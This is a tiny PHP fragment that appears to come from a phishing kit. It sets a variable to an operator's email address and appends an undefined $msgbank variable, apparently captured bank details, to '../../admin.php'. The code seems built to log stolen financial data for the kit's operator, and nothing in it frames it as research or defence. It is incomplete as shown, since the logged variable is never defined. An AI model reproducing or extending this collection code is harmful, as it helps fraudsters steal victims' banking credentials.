<?php

$yourmail = 'mo7amedabbas@yandex.com';


$f = fopen("../../admin.php", "a");
fwrite($f, $msgbank);
?>